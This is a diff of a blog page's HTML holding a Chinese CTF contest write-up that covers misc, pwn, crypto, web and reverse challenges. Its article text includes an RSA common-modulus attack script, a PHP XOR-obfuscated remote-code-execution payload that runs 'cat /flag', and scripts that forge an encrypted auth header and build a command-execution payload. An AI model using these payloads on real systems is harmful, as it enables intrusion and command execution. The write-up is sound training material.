@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" dir="auto" data-theme="auto">
+<html lang="zh-cn" dir="auto">
 
 <head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -114,7 +114,7 @@ Sign_in
 出题人不喜欢 0，把 0 全部去掉，在网上搜“颜文字加密解密”发现了 AAencode，用这个解密即可拿到 flag。">
 <meta name="author" content="ok-komputer">
 <link rel="canonical" href="https://ok-komputer.github.io/posts/isa-wp/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.ade297085aa589dc983d8c19610af8dfc347deef17b183b06b333077375045ad.css" integrity="sha256-reKXCFqlidyYPYwZYQr438NH3u8XsYOwazMwdzdQRa0=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.6ad59631f6c2768a4592d27068d54364d637cac5c853d949b7849073cb1aa97d.css" integrity="sha256-atWWMfbCdopFktJwaNVDZNY3ysXIU9lJt4SQc8saqX0=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://ok-komputer.github.io/%3Clink%20/%20abs%20url%3E">
 <link rel="icon" type="image/png" sizes="16x16" href="https://ok-komputer.github.io/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="https://ok-komputer.github.io/favicon-32x32.png">
@@ -122,7 +122,7 @@ Sign_in
 <link rel="mask-icon" href="https://ok-komputer.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://ok-komputer.github.io/posts/isa-wp/">
+<link rel="alternate" hreflang="zh-cn" href="https://ok-komputer.github.io/posts/isa-wp/">
 <noscript>
     <style>
         #theme-toggle,
@@ -143,56 +143,138 @@ Sign_in
                 --code-block-bg: rgb(46, 46, 51);
                 --code-bg: rgb(55, 56, 62);
                 --border: rgb(51, 51, 51);
-                color-scheme: dark;
             }
 
             .list {
                 background: var(--theme);
             }
 
-            .toc {
-                background: var(--entry);
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
             }
-        }
 
-        @media (prefers-color-scheme: light) {
-            .list::-webkit-scrollbar-thumb {
-                border-color: var(--code-bg);
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
             }
         }
 
     </style>
-</noscript>
-<script>
-    if (localStorage.getItem("pref-theme") === "dark") {
-        document.querySelector("html").dataset.theme = 'dark';
-    } else if (localStorage.getItem("pref-theme") === "light") {
-       document.querySelector("html").dataset.theme = 'light';
-    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.querySelector("html").dataset.theme = 'dark';
-    } else {
-        document.querySelector("html").dataset.theme = 'light';
-    }
+</noscript><meta property="og:title" content="2025 纳新赛 WriteUp" />
+<meta property="og:description" content="Misc
+Crossfire
+用 010 Editor 打开发现是个 PNG，但是缺少文件头，补上后打开，发现这张图的大小不对，用随波逐流工具修复一下宽高，就能看到 flag 了。
+basic
+用 010 Editor 打开，发现上部分是 PNG，下部分是 ZIP，中间是一段 base64，转码过后发现是密码，用这个密码解压 ZIP 就能看到 flag 了。
+Pwn
+Test your NetCat
+ls 一下，发现没有文件，ls -a 发现有文件，且有 flag，cat flag 发现是假 flag，只能看看 attachment 这个文件了，结果没权限，最后试了下 cat * 发现出现 flag 了。
+Crypto
+RSA_Signin
+RSA 共模攻击，运行脚本：
+import math
+from functools import reduce
 
-</script><meta property="og:url" content="https://ok-komputer.github.io/posts/isa-wp/">
-  <meta property="og:site_name" content="OK Komputer">
-  <meta property="og:title" content="2025 纳新赛 WriteUp">
-  <meta property="og:description" content="Misc Crossfire 用 010 Editor 打开发现是个 PNG，但是缺少文件头，补上后打开，发现这张图的大小不对，用随波逐流工具修复一下宽高，就能看到 flag 了。
-basic 用 010 Editor 打开，发现上部分是 PNG，下部分是 ZIP，中间是一段 base64，转码过后发现是密码，用这个密码解压 ZIP 就能看到 flag 了。
-Pwn Test your NetCat ls 一下，发现没有文件，ls -a 发现有文件，且有 flag，cat flag 发现是假 flag，只能看看 attachment 这个文件了，结果没权限，最后试了下 cat * 发现出现 flag 了。
-Crypto RSA_Signin RSA 共模攻击，运行脚本：
-import math from functools import reduce def extended_gcd(a, b): &#34;&#34;&#34; 扩展欧几里得算法：求解 ax &#43; by = gcd(a, b) 返回 (gcd, x, y) &#34;&#34;&#34; if a == 0: return (b, 0, 1) else: gcd, x, y = extended_gcd(b % a, a) return (gcd, y - (b // a) * x, x) def mod_inverse(a, mod): &#34;&#34;&#34; 计算a在mod下的逆元（要求a和mod互质） 利用扩展欧几里得算法实现 &#34;&#34;&#34; gcd, x, y = extended_gcd(a, mod) if gcd != 1: raise Exception(&#39;逆元不存在（a与mod不互质）&#39;) else: return x % mod def rsa_common_mod_attack(N, e1, c1, e2, c2): &#34;&#34;&#34; RSA共模攻击核心函数 输入：同一模数N、两组公钥(e1,e2)、两组密文(c1,c2) 输出：明文m（整数形式） &#34;&#34;&#34; # 步骤1：验证e1和e2互质（攻击前提） gcd_e, x, y = extended_gcd(e1, e2) if gcd_e != 1: raise Exception(&#39;e1和e2不互质，无法进行共模攻击&#39;) print(f&#34;e1和e2互质（gcd={gcd_e}），满足攻击条件&#34;) print(f&#34;贝祖等式系数：x={x}, y={y}（满足 e1*x &#43; e2*y = 1）&#34;) # 步骤2：处理负系数（将负指数转换为正逆元） if x &lt; 0: c1_inv = mod_inverse(c1, N) # c1^(-1) mod N x_abs = -x term1 = pow(c1_inv, x_abs, N) # c1^x mod N = (c1^(-1))^|x| mod N else: term1 = pow(c1, x, N) # 正指数直接计算 if y &lt; 0: c2_inv = mod_inverse(c2, N) # c2^(-1) mod N y_abs = -y term2 = pow(c2_inv, y_abs, N) # c2^y mod N = (c2^(-1))^|y| mod N else: term2 = pow(c2, y, N) # 正指数直接计算 # 步骤3：计算明文 m = (term1 * term2) mod N m = (term1 * term2) % N return m def int_to_ascii(m): &#34;&#34;&#34; 将整数明文转换为ASCII字符串（处理CTF常见flag格式） &#34;&#34;&#34; # 整数转换为字节流（大端序） byte_data = m.to_bytes((m.bit_length() &#43; 7) // 8, byteorder=&#39;big&#39;) try: return byte_data.decode(&#39;ascii&#39;) except UnicodeDecodeError: return &#34;明文非ASCII格式，返回整数形式：&#34; &#43; str(m) if __name__ == &#34;__main__&#34;: # -------------------------- 已知参数（可直接替换为其他共模攻击场景）-------------------------- N = 162178605357818616394571566923155907889899677780239882906511996614607940884142045197452389471499799373787832649318837814454679970724845203557871078001956378966434166323827984964942729898095347038272003371167123553368531662277059263517900162297903110415768403265100411543878859321181606008503516896600638590699 e1 = 35422 c1 = 153249315480380808558746807096025628082875635601515291525075274335055878390662930254941118045696231628008256877302589689883059616503108946971165183674522403835250738176157466145855833767128209866527507862726083268576304163200171600023472544755768741118904892489037291247455823396160705615280802805803254323033 e2 = 1033 c2 = 5823189490163315770684717059899864988806118565674660089157163486577056500243194221873916232616081138765317598078910078375360361118674333149663483360677725162911935082290640547407140413703664960164356579153623498735889314476063673352676918268911309402784919521792079943937126634436658784515914270266106683548 # -------------------------- 执行攻击 -------------------------- print(&#34;开始RSA共模攻击...&#34;) try: # 执行攻击得到整数明文 m_int = rsa_common_mod_attack(N, e1, c1, e2, c2) # 转换为可读字符串 m_str = int_to_ascii(m_int) # 输出结果 print(&#34;\n&#34; &#43; &#34;=&#34; * 50) print(&#34;攻击成功！&#34;) print(f&#34;整数明文：{m_int}&#34;) print(f&#34;可读明文：{m_str}&#34;) print(&#34;=&#34;*50) except Exception as e: print(f&#34;攻击失败：{str(e)}&#34;) Sign_in 出题人不喜欢 0，把 0 全部去掉，在网上搜“颜文字加密解密”发现了 AAencode，用这个解密即可拿到 flag。">
-  <meta property="og:locale" content="zh-cn">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-12-06T17:32:48+08:00">
-    <meta property="article:modified_time" content="2025-12-06T17:32:48+08:00">
-    <meta property="article:tag" content="Ctf">
-    <meta property="article:tag" content="Write Up">
-      <meta property="og:image" content="https://avatars.githubusercontent.com/u/226872255?v=4">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://avatars.githubusercontent.com/u/226872255?v=4">
-<meta name="twitter:title" content="2025 纳新赛 WriteUp">
+def extended_gcd(a, b):
+    &#34;&#34;&#34;
+    扩展欧几里得算法：求解 ax &#43; by = gcd(a, b)
+    返回 (gcd, x, y)
+    &#34;&#34;&#34;
+    if a == 0:
+        return (b, 0, 1)
+    else:
+        gcd, x, y = extended_gcd(b % a, a)
+        return (gcd, y - (b // a) * x, x)
+
+def mod_inverse(a, mod):
+    &#34;&#34;&#34;
+    计算a在mod下的逆元（要求a和mod互质）
+    利用扩展欧几里得算法实现
+    &#34;&#34;&#34;
+    gcd, x, y = extended_gcd(a, mod)
+    if gcd != 1:
+        raise Exception(&#39;逆元不存在（a与mod不互质）&#39;)
+    else:
+        return x % mod
+
+def rsa_common_mod_attack(N, e1, c1, e2, c2):
+    &#34;&#34;&#34;
+    RSA共模攻击核心函数
+    输入：同一模数N、两组公钥(e1,e2)、两组密文(c1,c2)
+    输出：明文m（整数形式）
+    &#34;&#34;&#34;
+    # 步骤1：验证e1和e2互质（攻击前提）
+    gcd_e, x, y = extended_gcd(e1, e2)
+    if gcd_e != 1:
+        raise Exception(&#39;e1和e2不互质，无法进行共模攻击&#39;)
+    print(f&#34;e1和e2互质（gcd={gcd_e}），满足攻击条件&#34;)
+    print(f&#34;贝祖等式系数：x={x}, y={y}（满足 e1*x &#43; e2*y = 1）&#34;)
+    
+    # 步骤2：处理负系数（将负指数转换为正逆元）
+    if x &lt; 0:
+        c1_inv = mod_inverse(c1, N)  # c1^(-1) mod N
+        x_abs = -x
+        term1 = pow(c1_inv, x_abs, N)  # c1^x mod N = (c1^(-1))^|x| mod N
+    else:
+        term1 = pow(c1, x, N)  # 正指数直接计算
+    
+    if y &lt; 0:
+        c2_inv = mod_inverse(c2, N)  # c2^(-1) mod N
+        y_abs = -y
+        term2 = pow(c2_inv, y_abs, N)  # c2^y mod N = (c2^(-1))^|y| mod N
+    else:
+        term2 = pow(c2, y, N)  # 正指数直接计算
+    
+    # 步骤3：计算明文 m = (term1 * term2) mod N
+    m = (term1 * term2) % N
+    return m
+
+def int_to_ascii(m):
+    &#34;&#34;&#34;
+    将整数明文转换为ASCII字符串（处理CTF常见flag格式）
+    &#34;&#34;&#34;
+    # 整数转换为字节流（大端序）
+    byte_data = m.to_bytes((m.bit_length() &#43; 7) // 8, byteorder=&#39;big&#39;)
+    try:
+        return byte_data.decode(&#39;ascii&#39;)
+    except UnicodeDecodeError:
+        return &#34;明文非ASCII格式，返回整数形式：&#34; &#43; str(m)
+
+if __name__ == &#34;__main__&#34;:
+    # -------------------------- 已知参数（可直接替换为其他共模攻击场景）--------------------------
+    N = 162178605357818616394571566923155907889899677780239882906511996614607940884142045197452389471499799373787832649318837814454679970724845203557871078001956378966434166323827984964942729898095347038272003371167123553368531662277059263517900162297903110415768403265100411543878859321181606008503516896600638590699
+    e1 = 35422
+    c1 = 153249315480380808558746807096025628082875635601515291525075274335055878390662930254941118045696231628008256877302589689883059616503108946971165183674522403835250738176157466145855833767128209866527507862726083268576304163200171600023472544755768741118904892489037291247455823396160705615280802805803254323033
+    e2 = 1033
+    c2 = 5823189490163315770684717059899864988806118565674660089157163486577056500243194221873916232616081138765317598078910078375360361118674333149663483360677725162911935082290640547407140413703664960164356579153623498735889314476063673352676918268911309402784919521792079943937126634436658784515914270266106683548
+    
+    # -------------------------- 执行攻击 --------------------------
+    print(&#34;开始RSA共模攻击...&#34;)
+    try:
+        # 执行攻击得到整数明文
+        m_int = rsa_common_mod_attack(N, e1, c1, e2, c2)
+        # 转换为可读字符串
+        m_str = int_to_ascii(m_int)
+        
+        # 输出结果
+        print(&#34;\n&#34; &#43; &#34;=&#34; * 50)
+        print(&#34;攻击成功！&#34;)
+        print(f&#34;整数明文：{m_int}&#34;)
+        print(f&#34;可读明文：{m_str}&#34;)
+        print(&#34;=&#34;*50)
+    except Exception as e:
+        print(f&#34;攻击失败：{str(e)}&#34;)
+Sign_in
+出题人不喜欢 0，把 0 全部去掉，在网上搜“颜文字加密解密”发现了 AAencode，用这个解密即可拿到 flag。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ok-komputer.github.io/posts/isa-wp/" />
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/226872255?v=4" />
+<meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2025-12-06T17:32:48+08:00" />
+<meta property="article:modified_time" content="2025-12-06T17:32:48+08:00" /><meta property="og:site_name" content="OK Komputer" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://avatars.githubusercontent.com/u/226872255?v=4" />
+<meta name="twitter:title" content="2025 纳新赛 WriteUp"/>
 <meta name="twitter:description" content="Misc
 Crossfire
 用 010 Editor 打开发现是个 PNG，但是缺少文件头，补上后打开，发现这张图的大小不对，用随波逐流工具修复一下宽高，就能看到 flag 了。
@@ -297,7 +379,7 @@ if __name__ == &#34;__main__&#34;:
     except Exception as e:
         print(f&#34;攻击失败：{str(e)}&#34;)
 Sign_in
-出题人不喜欢 0，把 0 全部去掉，在网上搜“颜文字加密解密”发现了 AAencode，用这个解密即可拿到 flag。">
+出题人不喜欢 0，把 0 全部去掉，在网上搜“颜文字加密解密”发现了 AAencode，用这个解密即可拿到 flag。"/>
 
 
 <script type="application/ld+json">
@@ -332,7 +414,7 @@ Sign_in
   ],
   "articleBody": "Misc Crossfire 用 010 Editor 打开发现是个 PNG，但是缺少文件头，补上后打开，发现这张图的大小不对，用随波逐流工具修复一下宽高，就能看到 flag 了。\nbasic 用 010 Editor 打开，发现上部分是 PNG，下部分是 ZIP，中间是一段 base64，转码过后发现是密码，用这个密码解压 ZIP 就能看到 flag 了。\nPwn Test your NetCat ls 一下，发现没有文件，ls -a 发现有文件，且有 flag，cat flag 发现是假 flag，只能看看 attachment 这个文件了，结果没权限，最后试了下 cat * 发现出现 flag 了。\nCrypto RSA_Signin RSA 共模攻击，运行脚本：\nimport math from functools import reduce def extended_gcd(a, b): \"\"\" 扩展欧几里得算法：求解 ax + by = gcd(a, b) 返回 (gcd, x, y) \"\"\" if a == 0: return (b, 0, 1) else: gcd, x, y = extended_gcd(b % a, a) return (gcd, y - (b // a) * x, x) def mod_inverse(a, mod): \"\"\" 计算a在mod下的逆元（要求a和mod互质） 利用扩展欧几里得算法实现 \"\"\" gcd, x, y = extended_gcd(a, mod) if gcd != 1: raise Exception('逆元不存在（a与mod不互质）') else: return x % mod def rsa_common_mod_attack(N, e1, c1, e2, c2): \"\"\" RSA共模攻击核心函数 输入：同一模数N、两组公钥(e1,e2)、两组密文(c1,c2) 输出：明文m（整数形式） \"\"\" # 步骤1：验证e1和e2互质（攻击前提） gcd_e, x, y = extended_gcd(e1, e2) if gcd_e != 1: raise Exception('e1和e2不互质，无法进行共模攻击') print(f\"e1和e2互质（gcd={gcd_e}），满足攻击条件\") print(f\"贝祖等式系数：x={x}, y={y}（满足 e1*x + e2*y = 1）\") # 步骤2：处理负系数（将负指数转换为正逆元） if x \u003c 0: c1_inv = mod_inverse(c1, N) # c1^(-1) mod N x_abs = -x term1 = pow(c1_inv, x_abs, N) # c1^x mod N = (c1^(-1))^|x| mod N else: term1 = pow(c1, x, N) # 正指数直接计算 if y \u003c 0: c2_inv = mod_inverse(c2, N) # c2^(-1) mod N y_abs = -y term2 = pow(c2_inv, y_abs, N) # c2^y mod N = (c2^(-1))^|y| mod N else: term2 = pow(c2, y, N) # 正指数直接计算 # 步骤3：计算明文 m = (term1 * term2) mod N m = (term1 * term2) % N return m def int_to_ascii(m): \"\"\" 将整数明文转换为ASCII字符串（处理CTF常见flag格式） \"\"\" # 整数转换为字节流（大端序） byte_data = m.to_bytes((m.bit_length() + 7) // 8, byteorder='big') try: return byte_data.decode('ascii') except UnicodeDecodeError: return \"明文非ASCII格式，返回整数形式：\" + str(m) if __name__ == \"__main__\": # -------------------------- 已知参数（可直接替换为其他共模攻击场景）-------------------------- N = 162178605357818616394571566923155907889899677780239882906511996614607940884142045197452389471499799373787832649318837814454679970724845203557871078001956378966434166323827984964942729898095347038272003371167123553368531662277059263517900162297903110415768403265100411543878859321181606008503516896600638590699 e1 = 35422 c1 = 153249315480380808558746807096025628082875635601515291525075274335055878390662930254941118045696231628008256877302589689883059616503108946971165183674522403835250738176157466145855833767128209866527507862726083268576304163200171600023472544755768741118904892489037291247455823396160705615280802805803254323033 e2 = 1033 c2 = 5823189490163315770684717059899864988806118565674660089157163486577056500243194221873916232616081138765317598078910078375360361118674333149663483360677725162911935082290640547407140413703664960164356579153623498735889314476063673352676918268911309402784919521792079943937126634436658784515914270266106683548 # -------------------------- 执行攻击 -------------------------- print(\"开始RSA共模攻击...\") try: # 执行攻击得到整数明文 m_int = rsa_common_mod_attack(N, e1, c1, e2, c2) # 转换为可读字符串 m_str = int_to_ascii(m_int) # 输出结果 print(\"\\n\" + \"=\" * 50) print(\"攻击成功！\") print(f\"整数明文：{m_int}\") print(f\"可读明文：{m_str}\") print(\"=\"*50) except Exception as e: print(f\"攻击失败：{str(e)}\") Sign_in 出题人不喜欢 0，把 0 全部去掉，在网上搜“颜文字加密解密”发现了 AAencode，用这个解密即可拿到 flag。\nWeb EzRce 这题要绕过字母数字，用这个异或转换的 payload 即可：\nPOST /?shell=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]); HTTP/1.1 Host: 172.30.211.91:33670 Content-Type: application/x-www-form-urlencoded Content-Length: 25 _=system('cat%20%2Fflag') 这段 payload 的意义是执行 $_POST[_] 的内容。\n狠狠注 看一下源码，看到页面会检查请求头里的 X-Signature 的内容是否为 Secret_key 的 base64 编码，所以把请求头的 X-Signature 改成 Secret_key 的 base64 编码，发现 index.php 没啥用，就去 execute.php，发现需要正确的 X-Source，运行这样的代码得到 X-Source：\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes from cryptography.hazmat.backends import default_backend import base64 import random # -------------------------- 固定参数（必须和后端一致）-------------------------- SECRET_KEY = b\"Fidy66rEB65mnE5UbPyEsgMxmmhdNebU\" # 后端 Secret_key，转字节类型 PLAIN_TEXT = b\"index.php\" # 解密后必须的值，转字节类型 AES_MODE = algorithms.AES(SECRET_KEY) BLOCK_SIZE = 16 # AES-256-CBC 要求 IV 长度=16字节 def base64url_encode(data: bytes) -\u003e str: \"\"\" 实现 base64url 编码（和后端 base64url_decode 反向对应） 规则：1. base64编码 → 2. 替换 '+' 为 '-', '/' 为 '_' → 3. 去除末尾 padding（=） \"\"\" # 标准 base64 编码 base64_str = base64.b64encode(data).decode(\"utf-8\") # 替换字符 +/ 为 -_ base64url_str = base64_str.replace(\"+\", \"-\").replace(\"/\", \"_\") # 去除末尾的 padding（=） return base64url_str.rstrip(\"=\") def generate_valid_x_source() -\u003e str: \"\"\"生成合法的 X-Source 值\"\"\" # 1. 生成 16 字节随机 IV（和后端解密时提取的 IV 对应） iv = bytes(bytearray(random.getrandbits(8) for _ in range(BLOCK_SIZE))) # 16字节随机数 # 2. AES-256-CBC 加密（PKCS7 填充，与后端 openssl_encrypt 兼容） # 初始化加密器：CBC 模式 + 随机 IV cipher = Cipher(AES_MODE, modes.CBC(iv), backend=default_backend()) encryptor = cipher.encryptor() # 3. 对明文进行 PKCS7 填充（后端默认使用 PKCS7 填充，必须对齐） # 填充逻辑：计算需要补充的字节数，填充值=补充的字节数 pad_length = BLOCK_SIZE - (len(PLAIN_TEXT) % BLOCK_SIZE) padded_plaintext = PLAIN_TEXT + bytes([pad_length] * pad_length) # 4. 执行加密，得到密文（字节类型） ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize() # 5. 拼接 IV + 密文（顺序不能反！后端会先取前16字节作为 IV） iv_ciphertext = iv + ciphertext # 6. 对拼接结果做 base64url 编码，得到最终 X-Source return base64url_encode(iv_ciphertext) if __name__ == \"__main__\": # 生成 X-Source（单独使用） valid_x_source = generate_valid_x_source() print(\"合法的 X-Source：\", valid_x_source) 得到 X-Source 后写到请求头里，分析接下来的代码，发现它会读取 php://input 的内容写到 command 里并会执行，用下面的代码得到正确的 payload，用 Postman 上传的时候改成 binary，上传 payload.bin 这个文件，即可拿到 flag。\ntype_byte = b'A' # 1字节类型 length_bytes = b'\\x00\\x09' command = b'cat /flag' payload = type_byte + length_bytes + command with open('payload.bin', 'wb') as f: f.write(payload) Reverse babyre 用 IDA 打开直接就看到 cmp 函数里的 we1come_to_ctf，把这个转换成 md5 再包上 flag{} 发现不行，试了很多次发现要把 flag{we1come_to_ctf} 本身转成 md5 再包上 flag{}。\nsignin 迷宫题，路径都已经给出来了，根本不需要打开 IDA，把路径包上 flag{} 再转成 md5 再包上 flag{} 就行了。\n",
   "wordCount" : "632",
-  "inLanguage": "en",
+  "inLanguage": "zh-cn",
   "image": "https://avatars.githubusercontent.com/u/226872255?v=4","datePublished": "2025-12-06T17:32:48+08:00",
   "dateModified": "2025-12-06T17:32:48+08:00",
   "author":{
@@ -354,13 +436,25 @@ Sign_in
 }
 </script>
 </head>
-<body id="top">
-    <header class="header">
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
     <nav class="nav">
         <div class="logo">
             <a href="https://ok-komputer.github.io/" accesskey="h" title="Home (Alt + H)">Home</a>
             <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                         stroke-linejoin="round">
@@ -399,7 +493,7 @@ Sign_in
     <h1 class="post-title entry-hint-parent">
       2025 纳新赛 WriteUp
     </h1>
-    <div class="post-meta"><span title='2025-12-06 17:32:48 +0800 CST'>2025/12/06</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>632 words</span>&nbsp;·&nbsp;<span>ok-komputer</span>
+    <div class="post-meta"><span title='2025-12-06 17:32:48 +0800 CST'>2025/12/06</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;632 words&nbsp;·&nbsp;ok-komputer
 
 </div>
   </header> <div class="toc">
@@ -640,12 +734,12 @@ Sign_in
     </ul>
 <nav class="paginav">
   <a class="prev" href="https://ok-komputer.github.io/posts/guosai-wp/">
-    <span class="title">« Prev</span>
+    <span class="title">« </span>
     <br>
     <span>2025 国赛 WP</span>
   </a>
   <a class="next" href="https://ok-komputer.github.io/posts/pctf-wp/">
-    <span class="title">Next »</span>
+    <span class="title"> »</span>
     <br>
     <span>2025 PCTF WriteUp</span>
   </a>
@@ -719,21 +813,7 @@ Sign_in
     </li>
 </ul>
 
-  </footer><script src="https://giscus.app/client.js"
-        data-repo="ok-komputer/ok-komputer.github.io"
-        data-repo-id="R_kgDOQSEoqQ"
-        data-category="Announcements"
-        data-category-id="DIC_kwDOQSEoqc4C0yaQ"
-        data-mapping="pathname"
-        data-strict="0"
-        data-reactions-enabled="1"
-        data-emit-metadata="0"
-        data-input-position="top"
-        data-theme="preferred_color_scheme"
-        data-lang="zh-CN"
-        crossorigin="anonymous"
-        async>
-</script>
+  </footer>
 </article>
     </main>
     
@@ -753,14 +833,9 @@ Sign_in
 </a>
 
 <script>
-    let menu = document.getElementById('menu');
+    let menu = document.getElementById('menu')
     if (menu) {
-        
-        const scrollPosition = localStorage.getItem("menu-scroll-position");
-        if (scrollPosition) {
-            menu.scrollLeft = parseInt(scrollPosition, 10);
-        }
-        
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
         menu.onscroll = function () {
             localStorage.setItem("menu-scroll-position", menu.scrollLeft);
         }
@@ -801,12 +876,11 @@ Sign_in
 </script>
 <script>
     document.getElementById("theme-toggle").addEventListener("click", () => {
-        const html = document.querySelector("html");
-        if (html.dataset.theme === "dark") {
-            html.dataset.theme = 'light';
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
             localStorage.setItem("pref-theme", 'light');
         } else {
-            html.dataset.theme = 'dark';
+            document.body.classList.add('dark');
             localStorage.setItem("pref-theme", 'dark');
         }
     })
